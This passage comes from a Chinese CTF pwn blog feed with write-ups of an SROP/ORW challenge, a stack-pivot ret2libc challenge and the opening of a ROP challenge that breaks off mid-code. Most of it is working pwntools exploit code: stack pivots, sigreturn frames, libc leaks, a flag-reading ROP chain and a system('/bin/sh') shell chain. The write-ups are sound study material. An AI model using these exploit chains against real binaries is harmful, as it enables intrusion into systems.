./pwn<br></code></pre></td></tr></table></figure><p>查看，发现禁用了<code>execve</code>，所以只能打ORW(open,read,write)，让我们找找关于寄存器的gadget，额，竟然什么都找不到…</p><p>但是我们找到了一个<code>syscall</code>的汇编指令，所以在这种情况下，我们就要使用一招系统内核级的利用，<code>SROP</code>，linux存在一种信号处理机制，当进程收到信号时，内核会先暂停进程执行，然后保存当前寄存器状态到用户栈(sigcontext)，接下来跳转到信号处理函数，等信号处理函数执行完毕后，调用<code>sigreturn</code>系统调用，内核从栈上恢复寄存器状态，因此，我们可以伪造sigcontext结构，同时设置<code>rax</code>为<code>sigreturn</code>的系统调用号<code>15</code>(x86-64)，并执行<code>syscall</code>指令触发<code>sigreturn</code>机制，内核便会从我们伪造的<code>sigcontext</code>中恢复所有我们所设定的寄存器值，从而完全控制进程执行流!</p><p>然而还有一个关键点在于如何将rax设置为15，因为并没有<code>pop rax; ret;</code>的gadget，这时，”不难”想到，rax寄存器上保存的是函数的返回值，我们可以在read时读入15个字节长度的数据，此时rax便被巧妙地设置为了15，此时再执行syscall即可调用sigreturn机制打我们的<code>SROP</code>了</p><p>当然，为了不破坏栈的结构，我们仍然需要利用<code>stack pivot</code>迁移至bss段上伪造我们的栈帧并布局我们的利用链…</p><p>先把有用的地址列出来</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">read = <span class="hljs-number">0x4012a9</span>    <span class="hljs-comment">#对应执行我们的第二次read的地址</span><br>syscall = <span class="hljs-number">0x4012fa</span><br>leave_ret = <span class="hljs-number">0x4012d3</span>    <span class="hljs-comment">#栈迁移的关键</span><br>puts_got = <span class="hljs-number">0x404010</span><br>puts_plt = <span class="hljs-number">0x4010b0</span><br>bss = <span class="hljs-number">0x404090</span> + <span class="hljs-number">0x500</span>  <span class="hljs-comment">#0x404590(布局的地方)</span><br></code></pre></td></tr></table></figure><p>第一次的read直接跳过，来到我们的第二次read，首先将<code>rbp</code>迁移至bss段，并重新执行一次read(想必都会了吧)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">p.sendafter(<span class="hljs-string">b&quot;re you doing here?\n&quot;</span>,<span class="hljs-string">b&quot;beef&quot;</span>)<br><br>p.sendafter(<span class="hljs-string">b&quot;TOP doing this!\n&quot;</span>,<span class="hljs-string">b&quot;A&quot;</span> * <span class="hljs-number">0x70</span> + p64(bss) + p64(read))<br></code></pre></td></tr></table></figure><p>这时在bss段上形成了新的栈帧，我们步骤好srop的<code>sigcontext</code>以泄露libc基址，并进行第二次段内迁移</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python">p.recvuntil(<span class="hljs-string">b&quot;doing this!\n&quot;</span>)<br>payload = p64(bss + <span class="hljs-number">0x10</span>) + p64(read)   <br>payload = payload.ljust(<span class="hljs-number">0x70</span>,<span class="hljs-string">b&quot;\x00&quot;</span>)<br>payload += p64(bss - <span class="hljs-number">0x70</span>)<br>payload += p64(leave_ret)<br>payload += p64(bss+<span class="hljs-number">0x100</span>)<br>payload += p64(syscall)<br><br>frame3 = SigreturnFrame()<br>frame3.rip = puts_plt<br>frame3.rsp = bss - <span class="hljs-number">0x60</span> + <span class="hljs-number">8</span><br>frame3.rbp = bss + <span class="hljs-number">0x210</span><br>frame3.rax = <span class="hljs-number">15</span><br>frame3.rdi = puts_got<br>frame3.rsi = <span class="hljs-number">0</span><br>frame3.rdx = <span class="hljs-number">0</span><br><br>payload += <span class="hljs-built_in">bytes</span>(frame3)<br><br>p.send(payload)<br></code></pre></td></tr></table></figure><p>发送完这次payload后再次执行<code>read</code>，我们发送15字节长度的数据以将<code>rax</code>设置为15，同时注意，此时经过我们的布置，<code>rbp</code>目前在<code>0x4045a0</code>的位置，刚好新栈帧<code>rip</code>返回地址的位置便是我们的<code>syscall</code>和<code>sigcontext</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">p.sendafter(<span class="hljs-string">b&quot;TOP doing this!\n&quot;</span>,p64(bss) + <span class="hljs-string">b&quot;\xa9\x12\x40\x00\x00\x00\x00&quot;</span>)<br></code></pre></td></tr></table></figure><p>这次便会真正执行到我们的sigcontext中所设置的寄存器，即，泄露puts真实地址，从而得到libc基址，继而得到open,read,write和所需gadget的地址，而<code>rbp</code>被设置到更上方的地址再次布局我们最后的<code>ORW</code>，<code>rsp</code>设置在了我们先前<code>read</code>指令的所在地，因此，进行最后一次read，直接布置最终的rop链…</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python">libc_base = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))-libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(libc_base))<br><span class="hljs-built_in">open</span>=libc_base+libc.sym[<span class="hljs-string">&#x27;open&#x27;</span>]<br>write=libc_base+libc.sym[<span class="hljs-string">&#x27;write&#x27;</span>]<br>rread=libc_base+libc.sym[<span class="hljs-string">&#x27;read&#x27;</span>]<br>rdi=libc_base+<span class="hljs-number">0x10f78b</span><br>rsi=libc_base+<span class="hljs-number">0x110a7d</span><br>rdx=<span class="hljs-number">0x4012fc</span><br>ret=libc_base+<span class="hljs-number">0x2882f</span><br>p.recvuntil(<span class="hljs-string">b&quot;doing this!\n&quot;</span>)<br>payload = <span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">0x18</span>+p64(bss+<span class="hljs-number">0x10</span>)+<span class="hljs-string">b&#x27;B&#x27;</span>*<span class="hljs-number">0x50</span>+<span class="hljs-string">b&#x27;./flag\x00\x00&#x27;</span><br>payload += p64(rdi) + p64(bss+<span class="hljs-number">0x210</span>) + p64(rsi) + p64(<span class="hljs-number">0</span>) +p64(<span class="hljs-built_in">open</span>)  <span class="hljs-comment">#bss+0x210就是flag字符串的地址!</span><br>payload += p64(rdi) + p64(<span class="hljs-number">3</span>) + p64(rsi) + p64(bss+<span class="hljs-number">0x318</span>) + p64(rdx) + p64(<span class="hljs-number">0x100</span>) + p64(bss+<span class="hljs-number">0x318</span>) + p64(rread)  <span class="hljs-comment">#3为fd,rsi随便放哪里好了...</span><br>payload += p64(rdi) + p64(<span class="hljs-number">1</span>) + p64(rsi) + p64(bss+<span class="hljs-number">0x318</span>) + p64(rdx) + p64(<span class="hljs-number">0x100</span>) + p64(bss+<span class="hljs-number">0x318</span>) + p64(write)  <span class="hljs-comment">#将flag写到stdout，注意对齐...</span><br></code></pre></td></tr></table></figure><p>最终，在精妙的布局与利用下，我们成功获得了flag…</p><p>由于迷失于错综的地址，当时我也是对着<code>gdb</code>调试了老半天才算看懂这道题的wp，写出来过程也算了却一下自己的心魔，依旧贴一张图帮助你思考…</p><p><img src="/images/5.png" alt="内存布局"></p><p>最后贴一下完整exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#p=process(&#x27;./pwn&#x27;)</span><br>p=remote(<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>,<span class="hljs-number">40315</span>)<br>libc=ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br><br>read = <span class="hljs-number">0x4012a9</span><br>syscall = <span class="hljs-number">0x4012fa</span><br>leave_ret = <span class="hljs-number">0x4012d3</span><br>puts_got = <span class="hljs-number">0x404010</span><br>puts_plt = <span class="hljs-number">0x4010b0</span><br>bss = <span class="hljs-number">0x404090</span> + <span class="hljs-number">0x500</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(bss))<br><br>p.sendafter(<span class="hljs-string">b&quot;re you doing here?\n&quot;</span>,<span class="hljs-string">b&quot;beef&quot;</span>)<br><br>p.sendafter(<span class="hljs-string">b&quot;TOP doing this!\n&quot;</span>,<span class="hljs-string">b&quot;A&quot;</span> * <span class="hljs-number">0x70</span> + p64(bss) + p64(read))<br>p.recvuntil(<span class="hljs-string">b&quot;doing this!\n&quot;</span>)<br>payload = p64(bss + <span class="hljs-number">0x10</span>) + p64(read)<br>payload = payload.ljust(<span class="hljs-number">0x70</span>,<span class="hljs-string">b&quot;\x00&quot;</span>)<br>payload += p64(bss-<span class="hljs-number">0x70</span>)<br>payload += p64(leave_ret)<br>payload += p64(bss+<span class="hljs-number">0x100</span>)<br>payload += p64(syscall)<br><br>frame3 = SigreturnFrame()<br>frame3.rip = puts_plt<br>frame3.rsp = bss-<span class="hljs-number">0x60</span>+<span class="hljs-number">8</span><br>frame3.rbp = bss+<span class="hljs-number">0x210</span><br>frame3.rax = <span class="hljs-number">15</span><br>frame3.rdi = puts_got<br>frame3.rsi = <span class="hljs-number">0</span><br>frame3.rdx = <span class="hljs-number">0</span><br><br>payload += <span class="hljs-built_in">bytes</span>(frame3)<br><br>p.send(payload)<br><br>p.sendafter(<span class="hljs-string">b&quot;TOP doing this!\n&quot;</span>,p64(bss) + <span class="hljs-string">b&quot;\xa9\x12\x40\x00\x00\x00\x00&quot;</span>)<br><br>libc_base = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))-libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(libc_base))<br><span class="hljs-built_in">open</span>=libc_base+libc.sym[<span class="hljs-string">&#x27;open&#x27;</span>]<br>write=libc_base+libc.sym[<span class="hljs-string">&#x27;write&#x27;</span>]<br>rread=libc_base+libc.sym[<span class="hljs-string">&#x27;read&#x27;</span>]<br>rdi=libc_base+<span class="hljs-number">0x10f78b</span><br>rsi=libc_base+<span class="hljs-number">0x110a7d</span><br>rdx=<span class="hljs-number">0x4012fc</span><br>ret=libc_base+<span class="hljs-number">0x2882f</span><br>p.recvuntil(<span class="hljs-string">b&quot;doing this!\n&quot;</span>)<br>payload = <span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">0x18</span>+p64(bss+<span class="hljs-number">0x10</span>)+<span class="hljs-string">b&#x27;B&#x27;</span>*<span class="hljs-number">0x50</span>+<span class="hljs-string">b&#x27;./flag\x00\x00&#x27;</span><br>payload += p64(rdi) + p64(bss+<span class="hljs-number">0x210</span>) + p64(rsi) + p64(<span class="hljs-number">0</span>) +p64(<span class="hljs-built_in">open</span>)<br>payload += p64(rdi) + p64(<span class="hljs-number">3</span>) + p64(rsi) + p64(bss+<span class="hljs-number">0x318</span>) + p64(rdx) + p64(<span class="hljs-number">0x100</span>) + p64(bss+<span class="hljs-number">0x318</span>) + p64(rread)<br>payload += p64(rdi) + p64(<span class="hljs-number">1</span>) + p64(rsi) + p64(bss+<span class="hljs-number">0x318</span>) + p64(rdx) + p64(<span class="hljs-number">0x100</span>) + p64(bss+<span class="hljs-number">0x318</span>) + p64(write)<br><br>p.send(payload)<br><span class="hljs-comment">#gdb.attach(p)</span><br>p.interactive()<br><br></code></pre></td></tr></table></figure><p>就到这里便结束了，感谢阅读，生活愉快…</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>stack pivot</title>
    <link href="/2025/12/25/stack-pivot/"/>
    <url>/2025/12/25/stack-pivot/</url>
    
    <content type="html"><![CDATA[<p>题目出自哪里已经记不真切了</p><p>只依稀记得这是我正式做的第一道pwn题，当时的我就像刚出新手村的菜鸟遇见了大boss一般，与其鏖战了数个日夜才终于拿下</p><p>来看看吧!</p><p>题目逻辑非常之简单</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c">undefined8 <span class="hljs-title function_">main</span><span class="hljs-params">(EVP_PKEY_CTX *param_1)</span><br>&#123;<br>  undefined1 local_58 [<span class="hljs-number">80</span>];<br>  <br>  init(param_1);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Xswlhhh!Use stack hijacking on him!&quot;</span>);<br>  read(<span class="hljs-number">0</span>,local_58,<span class="hljs-number">0x60</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>题目的保护只有<code>NX</code></p><p>但是这在当时对于只会无脑溢出覆盖返回地址的我来说宛如噩梦，设置了local_58[80]，然而read只有0x60的大小，也就是说算上<code>saved rbp</code>只剩下最后的8个字节供我覆盖rip，而题目又有<code>NX</code>，长度完全不够执行rop链!怎么办呢?我查询资料，得知存在一种技术叫做:<code>栈迁移(stack pivot)</code></p><p>原理在于，将<code>saved rbp</code>覆盖为你想让rbp去的地方，将rip覆盖为再执行一次read的地址，因此执行逻辑便变为，main函数结束后，即将退出，执行<code>leave; ret;</code>的指令，而<code>saved rbp</code>已经被设置为我们想让它去的地方(通常是一个可读可写的地址段)，rip又一次执行read，最后在那个段空间重新分配一个新的栈帧，供我们自由发挥</p><p>这里有一些前置知识需要理解，当时困扰了我许久，现在写下来，首先是<code>leave; ret;</code>干了什么，你可以将其理解为两个阶段，先是leave，其相当于<code>mov rsp,rbp</code>和<code>pop rbp</code>，注意，最后，<code>rsp += 8</code>，然后执行<code>ret</code>指令，相当于<code>rip = *rsp</code>，注意，同样，<code>rsp += 8</code>，接下来，如何理解栈帧?其实cpu并不在乎rbp在哪里，它只关心执行流要干什么事儿</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asm">LEA RAX =&gt; local_58,[RBP + -0x50]<br></code></pre></td></tr></table></figure><p>read始于local_58[80]的地址，local_58[80]这个数组始终位于<code>rbp - 0x50</code>的位置，而<code>rbp + 0x8</code>的位置便是<code>rip</code>，栈帧布局永远如此，无论rbp在哪里，因此给了我们伪造新栈帧的利用空间</p><p>所以第一段payload如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">payload = <span class="hljs-string">b&quot;A&quot;</span> * <span class="hljs-number">0x50</span><br>payload += p64(elf.bss(<span class="hljs-number">0x800</span>))<br>payload += p64(<span class="hljs-number">0x4011e3</span>)  <span class="hljs-comment">#相当于重新执行一次read</span><br>sh.sendafter(<span class="hljs-string">b&quot;\n&quot;</span>,payload)<br></code></pre></td></tr></table></figure><p>这时一个新的栈帧在bss段中形成了</p><p>我们在新的栈帧中有了充足的空间来写rop链，因此便十分<em>easy</em>了，就打一个ret2libc吧，先来泄露libc基址</p><p>payload如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python">payload = p64(pop_rdi_ret) + p64(elf.got[<span class="hljs-string">&quot;puts&quot;</span>])<br>payload += p64(elf.plt[<span class="hljs-string">&quot;puts&quot;</span>])<br>payload += p64(elf.sym[<span class="hljs-string">&quot;main&quot;</span>])<br>payload = payload.ljust(<span class="hljs-number">0x50</span>,<span class="hljs-string">b&quot;\0&quot;</span>)<br>payload += p64(elf.bss(<span class="hljs-number">0x800</span>-<span class="hljs-number">0x58</span>))<br>payload += p64(leave_ret)<br>sh.sendafter(<span class="hljs-string">b&quot;\n&quot;</span>,payload)<br></code></pre></td></tr></table></figure><p>第一次看这个payload应该还是蛮懵的，不过对照着<code>leave; ret;</code>的含义在内存布局中多自己分析推导几遍便能理解其妙处所在，这里便不展开了</p><p>大致画一下内存布局供你分析</p><p><img src="/images/4.png" alt="内存布局"></p><p>接下来接收得到的puts真实地址并计算libc基址</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">libc.address = u64(sh.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&quot;\0&quot;</span>)) - libc.sym[<span class="hljs-string">&quot;puts&quot;</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;libc @&quot;</span>,<span class="hljs-built_in">hex</span>(libc.address))<br></code></pre></td></tr></table></figure><p>注意上述payload执行完后我们又回到了main函数，此时rsp经过一系列弹栈，应该位于<code>0x404810</code>的位置，而main函数起始处的指令再次布置了栈帧</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs asm">push rbp<br>mov rbp,rsp<br>sub rsp,0x50<br></code></pre></td></tr></table></figure><p>这段理解起来确实比较复杂，还是那句话，多动手调试(善用你的gdb)，思考，分析<em>汇编</em>，<strong>rsp</strong>，<strong>rbp</strong>，<strong>rip</strong>，<em>内存</em>等的变化</p><p>此时在新的栈帧上，类似于上面，我们布置我们的最终payload</p><p>如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python">payload = p64(pop_rdi_ret) + p64(<span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&quot;/bin/sh&quot;</span>)))<br>payload += p64(ret)  <span class="hljs-comment">#对齐!</span><br>payload += p64(libc.sym[<span class="hljs-string">&quot;system&quot;</span>])<br>payload = payload.ljust(<span class="hljs-number">0x50</span>,<span class="hljs-string">b&quot;\0&quot;</span>)<br>payload += p64(<span class="hljs-number">0x4047b0</span>)<br>payload += p64(leave_ret)<br>sh.sendafter(<span class="hljs-string">b&quot;\n&quot;</span>,payload)<br></code></pre></td></tr></table></figure><p>最后也是成功拿到shell</p><p>如果你彻底理解了这道题目，并能完整推理一遍过程，恭喜你，大抵是彻底理解了<code>stack pivot</code>这门技术，接下来迎接你的即将是更为复杂的栈布局，你加油，我也加油…</p><p>最后补一下完整exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>elf =ELF(<span class="hljs-string">&quot;./pivot&quot;</span>,<span class="hljs-literal">False</span>) <span class="hljs-comment">#本地...</span><br>libc = ELF(<span class="hljs-string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>,<span class="hljs-literal">False</span>)<br>context.binary = elf<br>sh = elf.process()<br><br>pop_rdi_ret = <span class="hljs-number">0x401225</span><br>leave_ret = <span class="hljs-number">0x40121b</span><br>ret = leave_ret + <span class="hljs-number">1</span><br><br>payload = <span class="hljs-string">b&quot;A&quot;</span> * <span class="hljs-number">0x50</span><br>payload += p64(elf.bss(<span class="hljs-number">0x800</span>))<br>payload += p64(<span class="hljs-number">0x4011e3</span>)<br>sh.sendafter(<span class="hljs-string">b&quot;\n&quot;</span>,payload)<br><br><br>payload = p64(pop_rdi_ret) + p64(elf.got[<span class="hljs-string">&quot;puts&quot;</span>])<br>payload += p64(elf.plt[<span class="hljs-string">&quot;puts&quot;</span>])<br>payload += p64(elf.sym[<span class="hljs-string">&quot;main&quot;</span>])<br>payload = payload.ljust(<span class="hljs-number">0x50</span>,<span class="hljs-string">b&quot;\0&quot;</span>)<br>payload += p64(elf.bss(<span class="hljs-number">0x800</span>-<span class="hljs-number">0x58</span>))<br>payload += p64(leave_ret)<br>sh.sendafter(<span class="hljs-string">b&quot;\n&quot;</span>,payload)<br><br>libc.address = u64(sh.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&quot;\0&quot;</span>)) - libc.sym[<span class="hljs-string">&quot;puts&quot;</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;libc @&quot;</span>,<span class="hljs-built_in">hex</span>(libc.address))<br>payload = p64(pop_rdi_ret) + p64(<span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&quot;/bin/sh&quot;</span>)))<br>payload += p64(ret)<br>payload += p64(libc.sym[<span class="hljs-string">&quot;system&quot;</span>])<br>payload = payload.ljust(<span class="hljs-number">0x50</span>,<span class="hljs-string">b&quot;\0&quot;</span>)<br>payload += p64(<span class="hljs-number">0x4047b0</span>)<br>payload += p64(leave_ret)<br>sh.sendafter(<span class="hljs-string">b&quot;\n&quot;</span>,payload)<br><br>sh.interactive()<br></code></pre></td></tr></table></figure><p>感谢阅读…</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>a_strange_rop</title>
    <link href="/2025/12/25/a-strange-rop/"/>
    <url>/2025/12/25/a-strange-rop/</url>
    
    <content type="html"><![CDATA[<p>题目来自2025XSWCTF决赛的pwn题: <code>a_atrange_rop</code></p><p>题目为64为动态链接elf文件</p><p>保护为<code>NX</code>和<code>canary</code></p><p>既然题目叫a_stranre_rop</p><p>我们先看看有没有gadget</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ROPgadget --binary ./a_strange_rop | grep <span class="hljs-string">&quot;pop rdi&quot;</span><br></code></pre></td></tr></table></figure><p>找到了<code>pop rdi; ret;</code>这样的一个gadget</p><p>先观察一下题目逻辑</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c">undefined8 <span class="hljs-title function_">main</span><span class="hljs-params">(EVP_PKEY_CTX *param_1)</span><br>&#123;<br>  <span class="hljs-type">int</span> iVar1;<br>  <br>  init(param_1);<br>  iVar1 = game();<br>  <span class="hljs-keyword">if</span> (iVar1 == <span class="hljs-number">1</span>) &#123;<br>    win();<br>  &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>init为初始化函数，无实际意义，忽略</p><p>我们先来看一下win函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">win</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br><br>&#123;<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;good!&quot;</span>);<br>  system(<span class="hljs-string">&quot;ababalabalabalawuwuwuuwyyyyy&quot;</span>);<br>  <span class="hljs-keyword">return</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>可以看到即使调用了win也不会真的<code>win</code>，但是它为我们提供了<code>call system</code>这样一个系统调用的函数</p><p>配合我们的上面找到的gadget</p><p>似乎很容易就能写出system(“&#x2F;bin&#x2F;sh”)</p><p>来看看主逻辑game部分</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs c">undefined8 <span class="hljs-title function_">game</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br><br>&#123;<br>  <span class="hljs-type">int</span> iVar1;<br>  <span class="hljs-type">int</span> iVar2;<br>  <span class="hljs-type">time_t</span> tVar3;<br>  undefined8 uVar4;<br>  <span class="hljs-type">long</span> in_FS_OFFSET;<br>  <span class="hljs-type">int</span> local_78;<br>  uint local_74;<br>  <span class="hljs-type">long</span> local_68 [<span class="hljs-number">11</span>];<br>  <span class="hljs-type">long</span> local_10;<br>  <br>  local_10 = *(<span class="hljs-type">long</span> *)(in_FS_OFFSET + <span class="hljs-number">0x28</span>);<br>  id = <span class="hljs-number">0</span>;<br>  <span class="hljs-built_in">puts</span>(&amp;DAT_0040202b);<br>  tVar3 = time((<span class="hljs-type">time_t</span> *)<span class="hljs-number">0x0</span>);<br>  srand((uint)tVar3);<br>  <span class="hljs-keyword">for</span> (local_78 = <span class="hljs-number">0</span>; local_78 &lt; <span class="hljs-number">10</span>; local_78 = local_78 + <span class="hljs-number">1</span>) &#123;<br>    iVar1 = FUN_00401160();<br>    iVar2 = FUN_00401160();<br>    <span class="hljs-built_in">printf</span>(&amp;DAT_00402041,(ulong)id,(ulong)(uint)(iVar1 % <span class="hljs-number">0x14</span>),(ulong)(uint)(iVar2 % <span class="hljs-number">0x14</span>));<br>    (&amp;answer)[(<span class="hljs-type">int</span>)id] = (<span class="hljs-type">long</span>)(iVar2 % <span class="hljs-number">0x14</span> + iVar1 % <span class="hljs-number">0x14</span>);<br>    id = id + <span class="hljs-number">1</span>;<br>  &#125;<br>  <span class="hljs-built_in">puts</span>(&amp;DAT_00402058);<br>  <span class="hljs-keyword">for</span> (; t &lt; <span class="hljs-number">0xb</span>; t = t + <span class="hljs-number">1</span>) &#123;<br>    <span class="hljs-built_in">printf</span>(&amp;DAT_00402077);<br>    